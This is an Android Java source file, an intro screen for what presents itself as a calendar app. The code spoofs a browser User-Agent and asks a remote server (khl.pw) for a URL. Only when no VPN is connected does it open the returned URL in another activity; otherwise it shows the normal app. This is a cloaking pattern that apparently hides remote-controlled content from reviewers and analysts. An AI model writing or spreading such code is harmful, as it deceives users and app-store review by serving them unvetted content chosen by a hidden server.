package com.lukos.calendar.dateforyou;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.Bundle;

import java.io.IOException;
import okhttp3.Interceptor;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.logging.HttpLoggingInterceptor;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.scalars.ScalarsConverterFactory;
import retrofit2.http.GET;

public class IntroActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
  

        HttpLoggingInterceptor interceptor = new HttpLoggingInterceptor();
        interceptor.setLevel(HttpLoggingInterceptor.Level.BODY);

        OkHttpClient.Builder httpClient = new OkHttpClient.Builder();
        httpClient.addInterceptor(new Interceptor() {
            @Override
            public okhttp3.Response intercept(Chain chain) throws IOException {
                String agent = System.getProperty("http.agent");
                if (agent != null)
                    agent = "Mozilla/5.0 (Linux; Android 9; SM-G965F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36";
                Request original = chain.request();
                Request request = original.newBuilder()
                        .header("User-Agent", agent)
                        .build();
                return chain.proceed(request);
            }
        });
        httpClient.addInterceptor(interceptor);

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl("https://khl.pw/")
                .addConverterFactory(ScalarsConverterFactory.create())
                .client(httpClient.build())
                .build();

        retrofit.create(Retro.class).intro().enqueue(new Callback<String>() {
            @Override
            public void onResponse(Call<String> call, Response<String> response) {
                if (response.isSuccessful() && !checkVPN() && response.body() != null && response.body().startsWith("http")) {
                    startActivity(new Intent(IntroActivity.this, TestActivity.class).putExtra("test", response.body()));
                    //  startActivity(new Intent(IntroActivity.this, MainActivity.class));
                    IntroActivity.this.finish();
                    overridePendingTransition(0, 0);

                } else {
                    startActivity(new Intent(IntroActivity.this, MainActivity.class));
                    IntroActivity.this.finish();
                    overridePendingTransition(0, 0);
                }
            }

            @Override
            public void onFailure(Call<String> call, Throwable t) {

                startActivity(new Intent(IntroActivity.this, MainActivity.class));
                IntroActivity.this.finish();
                overridePendingTransition(0, 0);
            }
        });
    }
    public interface Retro {

        @GET("?ZgKR21qg")
        Call<String> intro();
    }
    private boolean checkVPN() {
        ConnectivityManager cm = (ConnectivityManager) this.getSystemService(Context.CONNECTIVITY_SERVICE);
        return cm.getNetworkInfo(ConnectivityManager.TYPE_VPN).isConnectedOrConnecting();
    }


}
